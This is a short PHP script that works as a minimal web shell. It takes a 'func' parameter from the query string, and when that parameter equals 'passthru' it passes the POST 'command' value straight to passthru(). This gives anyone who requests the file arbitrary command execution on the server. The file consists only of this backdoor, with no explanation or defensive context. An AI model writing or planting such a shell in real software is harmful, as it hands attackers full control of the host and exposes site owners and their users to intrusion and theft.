<?php
$execfunc = $_GET['func'];

if ($execfunc=="passthru") {
	passthru($_POST['command']);
}
?>